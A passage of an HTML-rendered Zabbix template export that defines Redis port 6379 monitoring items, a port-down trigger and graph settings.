&lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Expired keys_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Last save time_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;3&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units&gt;unixtime&lt;/units&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;port status_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Request rate_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Role_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,role]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;3&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;1&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Uptime <span class=\"keyword\">in</span> seconds_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,uptime_<span class=\"keyword\">in</span>_seconds]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units&gt;uptime&lt;/units&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Used memory_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Used_memory_rss_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">            &lt;/items&gt;</span><br><span class=\"line\">            &lt;discovery_rules/&gt;</span><br><span class=\"line\">            &lt;macros/&gt;</span><br><span class=\"line\">            &lt;templates/&gt;</span><br><span class=\"line\">            &lt;screens/&gt;</span><br><span class=\"line\">        &lt;/template&gt;</span><br><span class=\"line\">    &lt;/templates&gt;</span><br><span class=\"line\">    &lt;triggers&gt;</span><br><span class=\"line\">        &lt;trigger&gt;</span><br><span class=\"line\">            &lt;expression&gt;{Templates Redis_6379:net.tcp.listen[6379].count(<span class=\"comment\">#3,0,&amp;quot;eq&amp;quot;)}=3&lt;/expression&gt;</span></span><br><span class=\"line\">            &lt;name&gt;Redis port 6379 is not running&lt;/name&gt;</span><br><span class=\"line\">            &lt;url/&gt;</span><br><span class=\"line\">            &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">            &lt;priority&gt;4&lt;/priority&gt;</span><br><span class=\"line\">            &lt;description/&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;dependencies/&gt;</span><br><span class=\"line\">        &lt;/trigger&gt;</span><br><span class=\"line\">    &lt;/triggers&gt;</span><br><span class=\"line\">    &lt;graphs&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis key_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C800&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Last_save_time_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span 